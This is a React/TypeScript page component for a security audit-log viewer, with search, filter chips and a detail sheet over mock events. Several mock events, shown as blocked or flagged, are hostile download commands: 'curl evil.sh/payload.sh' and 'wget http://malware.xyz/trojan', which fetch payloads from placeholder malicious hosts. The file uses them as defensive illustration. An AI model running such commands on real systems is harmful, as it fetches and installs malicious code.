import { useState, useMemo } from 'react';
import { AuditEvent } from '../types';
import EventItem from '../components/EventItem';
import BottomSheet from '../components/BottomSheet';

const mockEvents: AuditEvent[] = [
  { id: '1', type: 'denied', message: 'Blocked: curl evil.sh/payload.sh', timestamp: new Date().toISOString(), user: 'guest', agent: 'staging-01', details: 'Network rule: no outbound to unknown hosts' },
  { id: '2', type: 'approved', message: 'Approved: sudo systemctl reload nginx', timestamp: new Date(Date.now() - 120000).toISOString(), user: 'ops', agent: 'prod-web-02' },
  { id: '3', type: 'command', message: 'kubectl get pods -n production', timestamp: new Date(Date.now() - 300000).toISOString(), user: 'admin', agent: 'prod-k8s-01' },
  { id: '4', type: 'alert', message: 'Suspicious: chmod +x /tmp/binary', timestamp: new Date(Date.now() - 600000).toISOString(), user: 'deploy', agent: 'prod-web-02', details: 'File not in allowlist, elevated permissions' },
  { id: '5', type: 'approved', message: 'Approved: docker restart app', timestamp: new Date(Date.now() - 900000).toISOString(), user: 'devops', agent: 'prod-k8s-01' },
  { id: '6', type: 'command', message: 'df -h', timestamp: new Date(Date.now() - 1200000).toISOString(), user: 'ops', agent: 'prod-db-01' },
  { id: '7', type: 'agent_join', message: 'dev-laptop connected', timestamp: new Date(Date.now() - 1800000).toISOString(), agent: 'dev-laptop' },
  { id: '8', type: 'policy_change', message: 'Network policy updated: block port 22 from 10.0.3.0/24', timestamp: new Date(Date.now() - 3600000).toISOString() },
  { id: '9', type: 'denied', message: 'Blocked: wget http://malware.xyz/trojan', timestamp: new Date(Date.now() - 7200000).toISOString(), user: 'guest', agent: 'staging-01' },
  { id: '10', type: 'agent_leave', message: 'ci-runner-03 disconnected', timestamp: new Date(Date.now() - 14400000).toISOString(), agent: 'ci-runner-03' },
];

const filters = ['all', 'denied', 'approved', 'alerts'] as const;
type Filter = typeof filters[number];

export default function Audit() {
  const [filter, setFilter] = useState<Filter>('all');
  const [search, setSearch] = useState('');
  const [selected, setSelected] = useState<AuditEvent | null>(null);

  const filtered = useMemo(() => {
    let events = mockEvents;
    if (filter === 'denied') events = events.filter(e => e.type === 'denied');
    else if (filter === 'approved') events = events.filter(e => e.type === 'approved');
    else if (filter === 'alerts') events = events.filter(e => e.type === 'alert');
    if (search) {
      const q = search.toLowerCase();
      events = events.filter(e => e.message.toLowerCase().includes(q) || (e.user?.toLowerCase().includes(q)) || (e.agent?.toLowerCase().includes(q)));
    }
    return events;
  }, [filter, search]);

  return (
    <div className="px-4 pt-4">
      <h1 className="font-bold text-lg mb-3">Audit Log</h1>

      {/* Search */}
      <input type="text" placeholder="Search events..." value={search} onChange={e => setSearch(e.target.value)}
        className="w-full px-4 py-3 rounded-xl bg-tg-surface text-sm text-tg-text placeholder:text-tg-hint outline-none mb-3 min-h-[44px]" />

      {/* Filter Chips */}
      <div className="flex gap-2 mb-4 overflow-x-auto pb-1 -mx-1 px-1">
        {filters.map(f => (
          <button key={f} onClick={() => setFilter(f)}
            className="px-3 py-1.5 rounded-full text-xs font-medium whitespace-nowrap min-h-[36px] transition-colors"
            style={{
              background: filter === f ? 'var(--tg-button)' : 'var(--tg-surface)',
              color: filter === f ? 'var(--tg-button-text)' : 'var(--tg-hint)',
            }}>
            {f.charAt(0).toUpperCase() + f.slice(1)}
          </button>
        ))}
      </div>

      {/* Events */}
      <div className="divide-y divide-white/5">
        {filtered.length === 0 ? (
          <p className="text-center text-tg-hint text-sm py-8">No events found</p>
        ) : (
          filtered.map(e => <EventItem key={e.id} event={e} onTap={setSelected} />)
        )}
      </div>

      <BottomSheet open={!!selected} onClose={() => setSelected(null)} title="Event Details">
        {selected && (
          <div className="space-y-3">
            <div>
              <span className="text-xs text-tg-hint">Message</span>
              <p className="text-sm mt-1">{selected.message}</p>
            </div>
            <div className="grid grid-cols-2 gap-3 text-sm">
              <div><span className="text-xs text-tg-hint">Type</span><p className="capitalize">{selected.type.replace('_', ' ')}</p></div>
              <div><span className="text-xs text-tg-hint">Time</span><p>{new Date(selected.timestamp).toLocaleString()}</p></div>
              {selected.user && <div><span className="text-xs text-tg-hint">User</span><p>{selected.user}</p></div>}
              {selected.agent && <div><span className="text-xs text-tg-hint">Agent</span><p>{selected.agent}</p></div>}
            </div>
            {selected.details && (
              <div>
                <span className="text-xs text-tg-hint">Details</span>
                <p className="text-sm mt-1 text-tg-hint">{selected.details}</p>
              </div>
            )}
          </div>
        )}
      </BottomSheet>
    </div>
  );
}
